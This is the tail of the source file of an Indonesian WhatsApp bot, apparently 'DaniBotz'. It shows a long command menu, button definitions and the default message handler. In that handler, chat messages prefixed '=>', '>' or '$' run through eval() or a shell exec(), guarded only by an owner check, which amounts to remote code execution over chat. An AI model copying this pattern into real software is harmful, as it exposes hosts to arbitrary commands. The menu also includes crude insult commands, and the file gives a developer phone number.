» ${prefix}foggy-window-writing
» ${prefix}fortune-cookie
» ${prefix}sand-writing
» ${prefix}snow-sign
» ${prefix}haunted-hotel
» ${prefix}light-graffiti
» ${prefix}lipstick-writing
» ${prefix}type-writer
» ${prefix}wooden-sign
» ${prefix}noir
» ${prefix}pendant
» ${prefix}plane-banner
» ${prefix}cookies-writing
» ${prefix}yacht
» ${prefix}soup-letters
» ${prefix}street-sign
» ${prefix}water-writing
» ${prefix}heart-tatto
» ${prefix}chalk-board
» ${prefix}cinema-ticket
» ${prefix}cross-stitch
» ${prefix}lifebuoy
» ${prefix}arrow-signs
» ${prefix}movie-marquee
» ${prefix}neon
» ${prefix}neon-writing
» ${prefix}snow-writing
» ${prefix}birthday-cake
» ${prefix}surfing-board
» ${prefix}tree-carving
» ${prefix}water-colour
» ${prefix}ledroad-sign

*｢  FUN & KERANG AJAIB  ｣*

» ${prefix}wangy 
» ${prefix}wangy2 
» ${prefix}nenen 
» ${prefix}simp 
» ${prefix}sherk 
» ${prefix}jadian
» ${prefix}jodohku
» ${prefix}apakah 
» ${prefix}bisakah 
» ${prefix}bagaimanakah 
» ${prefix}rate 
» ${prefix}gantengcek 
» ${prefix}cantikcek 
» ${prefix}sangecek 
» ${prefix}gaycek 
» ${prefix}lesbicek 
» ${prefix}kapankah 
» ${prefix}pintercek 
» ${prefix}suhucek 
» ${prefix}begocek 
» ${prefix}jelekcek 
» ${prefix}goblokcek 
» ${prefix}baikcek 
» ${prefix}bebancek 
» ${prefix}babicek 
» ${prefix}nolepcek 
» ${prefix}jagocek 
» ${prefix}pakgirlcek 
» ${prefix}pakboycek 
» ${prefix}haramcek 
» ${prefix}anjingcek 
» ${prefix}jahatcek 
» ${prefix}kerencek
» ${prefix}fakgirlcek 
» ${prefix}alimcek 
» ${prefix}fakboycek 
» ${prefix}bapercek 
» ${prefix}wibucek 

*｢  MUSLIM MENU  ｣*

» ${prefix}alquran
» ${prefix}juzamma
» ${prefix}tafsirsurah
» ${prefix}asmaulhusna
» ${prefix}niatsholat
» ${prefix}bacaansholat
» ${prefix}ayatkursi
» ${prefix}wirid
» ${prefix}tahlil
» ${prefix}kisahnabi 
» ${prefix}randomalquran
» ${prefix}ayataudio 

*｢  INFORMATION MENU  ｣*

» ${prefix}turnbackhoax
» ${prefix}corona
» ${prefix}jadwaltv
» ${prefix}jadwaltvnow
» ${prefix}jadwalbola
» ${prefix}kodepos
» ${prefix}kbbi

*｢  PRIMBON MENU  ｣*

» ${prefix}nomorhoki
» ${prefix}artimimpi
» ${prefix}artinama
» ${prefix}ramaljodoh
» ${prefix}ramaljodohbali
» ${prefix}suamiistri
» ${prefix}ramalcinta
» ${prefix}cocoknama
» ${prefix}pasangan
» ${prefix}jadiannikah
» ${prefix}sifatusaha
» ${prefix}rezeki
» ${prefix}pekerjaan
» ${prefix}nasib
» ${prefix}penyakit
» ${prefix}tarot
» ${prefix}fengshui
» ${prefix}haribaik
» ${prefix}harisangar
» ${prefix}harisial
» ${prefix}nagahari
» ${prefix}arahrezeki
» ${prefix}peruntungan
» ${prefix}weton
» ${prefix}karakter
» ${prefix}keberuntungan
» ${prefix}memancing
» ${prefix}masasubur
» ${prefix}zodiak
» ${prefix}shio

*｢  SOUND MENU  ｣*

» ${prefix}sound1
» ${prefix}sound2
» ${prefix}sound3
» ${prefix}sound4
» ${prefix}sound5
» ${prefix}sound6
» ${prefix}sound7
» ${prefix}sound8
» ${prefix}sound9
» ${prefix}sound10
» ${prefix}sound11
» ${prefix}sound12
» ${prefix}sound13
» ${prefix}sound14
» ${prefix}sound15
» ${prefix}sound16
» ${prefix}sound17
» ${prefix}sound18
» ${prefix}sound19
» ${prefix}sound20
» ${prefix}sound21
» ${prefix}sound22
» ${prefix}sound23
» ${prefix}sound24
» ${prefix}sound25
» ${prefix}sound26
» ${prefix}sound27
» ${prefix}sound28
» ${prefix}sound29
» ${prefix}sound30
» ${prefix}sound31
» ${prefix}sound32
» ${prefix}sound33
» ${prefix}sound34
» ${prefix}sound35
» ${prefix}sound36
» ${prefix}sound37
» ${prefix}sound38
» ${prefix}sound39
» ${prefix}sound40
» ${prefix}sound41
» ${prefix}sound42
» ${prefix}sound43
» ${prefix}sound44
» ${prefix}sound45
» ${prefix}sound46
» ${prefix}sound47
» ${prefix}sound48
» ${prefix}sound49
» ${prefix}sound50
» ${prefix}sound51
» ${prefix}sound52
» ${prefix}sound53
» ${prefix}sound54
» ${prefix}sound55
» ${prefix}sound56
» ${prefix}sound57
» ${prefix}sound58
» ${prefix}sound59
» ${prefix}sound60
» ${prefix}sound61
» ${prefix}sound62
» ${prefix}sound63
» ${prefix}sound64
» ${prefix}sound65
» ${prefix}sound66
» ${prefix}sound67
» ${prefix}sound68
» ${prefix}sound69
» ${prefix}sound70
» ${prefix}sound71
» ${prefix}sound72
» ${prefix}sound73
» ${prefix}sound74
» ${prefix}sound75
» ${prefix}sound76
» ${prefix}sound77
» ${prefix}sound78
» ${prefix}sound79
» ${prefix}sound80
» ${prefix}sound81
» ${prefix}sound82
» ${prefix}sound83
» ${prefix}sound84
» ${prefix}sound85
» ${prefix}sound86
» ${prefix}sound87
» ${prefix}sound88
» ${prefix}sound89
» ${prefix}sound90
» ${prefix}sound91
» ${prefix}sound92
» ${prefix}sound93
» ${prefix}sound94
» ${prefix}sound95
» ${prefix}sound96
» ${prefix}sound97
» ${prefix}sound98
» ${prefix}sound99
» ${prefix}sound100
» ${prefix}sound101
» ${prefix}sound102
» ${prefix}sound103
» ${prefix}sound104
» ${prefix}sound105
» ${prefix}sound106
» ${prefix}sound107
» ${prefix}sound108
» ${prefix}sound109
» ${prefix}sound110
» ${prefix}sound111
» ${prefix}sound112
» ${prefix}sound113
» ${prefix}sound114
» ${prefix}sound115
» ${prefix}sound116
» ${prefix}sound117
» ${prefix}sound118
» ${prefix}sound119
» ${prefix}sound120
» ${prefix}sound121
» ${prefix}sound122
» ${prefix}sound123
» ${prefix}sound124
» ${prefix}sound125
» ${prefix}sound126
» ${prefix}sound127
» ${prefix}sound128
» ${prefix}sound129
» ${prefix}sound130
» ${prefix}sound131
» ${prefix}sound132
» ${prefix}sound133
» ${prefix}sound134
» ${prefix}sound135
» ${prefix}sound136
» ${prefix}sound137
» ${prefix}sound138
» ${prefix}sound139
» ${prefix}sound140
» ${prefix}sound141
» ${prefix}sound142
» ${prefix}sound143
» ${prefix}sound144
» ${prefix}sound145
» ${prefix}sound146
» ${prefix}sound147
» ${prefix}sound148
» ${prefix}sound149
» ${prefix}sound150
» ${prefix}sound151
» ${prefix}sound152
» ${prefix}sound153
» ${prefix}sound154
» ${prefix}sound155
» ${prefix}sound156
» ${prefix}sound157
» ${prefix}sound158
» ${prefix}sound159
» ${prefix}sound160
» ${prefix}sound161

*｢  CONVERTER MENU  ｣*

» ${prefix}toimage
» ${prefix}removebg
» ${prefix}sticker
» ${prefix}stickerwm
» ${prefix}take
» ${prefix}emojimix
» ${prefix}tovideo
» ${prefix}togif
» ${prefix}tourl
» ${prefix}tovn
» ${prefix}tomp3
» ${prefix}toaudio
» ${prefix}ebinary
» ${prefix}dbinary
» ${prefix}styletext
» ${prefix}smeme

*｢  MAIN MENU  ｣*

» ${prefix}ping
» ${prefix}runtime
» ${prefix}owner
» ${prefix}menu
» ${prefix}get
» ${prefix}sc
» ${prefix}request
» ${prefix}report
» ${prefix}getpic
» ${prefix}profile
» ${prefix}getname
» ${prefix}dashboard
» ${prefix}infochat
» ${prefix}quoted
» ${prefix}listpc
» ${prefix}listgc
» ${prefix}listonline
» ${prefix}speedtest
» ${prefix}toonce
» ${prefix}tokohindo

*｢  VOICE CHARGER  ｣*

» ${prefix}bass
» ${prefix}blown
» ${prefix}deep
» ${prefix}earrape
» ${prefix}fast
» ${prefix}fat
» ${prefix}nightcore
» ${prefix}reverse
» ${prefix}robot
» ${prefix}slow
» ${prefix}tupai
`
let btn = [{
urlButton: {
displayText: 'SOURCE CODE',
url: 'https://github.com/Fxc08/DaniBotz'
}
}, {
callButton: {
displayText: 'DEVELOPER',
phoneNumber: '+62 857-1462-7920'
}
}, {
quickReplyButton: {
displayText: '📈 PING',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: '👑 OWNER',
id: 'owner'
}  
}, {
quickReplyButton: {
displayText: '📊 DASHBOARD',
id: 'dashboard'
}
}]
 let setbot = db.data.settings[botNumber]
if (setbot.templateImage) {
Dani.send5ButImg(m.chat, anu, `Made With 🤍 Dani | Copyright 2022`, global.image, btn, global.image)
} else if (setbot.templateGif) {
Dani.send5ButGif(m.chat, anu, `Made With 🤍 Dani | Copyright 2022`, global.video, btn, global.video)
} else if (setbot.templateVid) {
Dani.send5ButVid(m.chat, anu, `Made With 🤍 Dani | Copyright 2022`, global.video, btn, global.video)
} else if (setbot.templateMsg) {
Dani.send5ButMsg(m.chat, anu, `Made With 🤍 Dani | Copyright 2022`, btn)
} else if (setbot.templateLocation) {
Dani.send5ButLoc(m.chat, anu, `Made With 🤍 Dani | Copyright 2022`, global.image, btn)
}
}
break
default:
if ((m.mtype === 'reactionMessage') && m.isGroup) {
Dani.sendMessage(from, {text: `Terdeteksi *${m.pushName} @${m.sender.split("@")[0]}* Mengirim Reaction.`, mentions: [m.sender]}, {quoted: freply})
}

if (budy.startsWith('=>')) {
if (!isCreator) return sticOwner(from)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return sticOwner(from)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return sticOwner(from)
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)
})
}

if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
let room = Object.values(db.data.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
return !0
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
Dani.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
m.reply(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
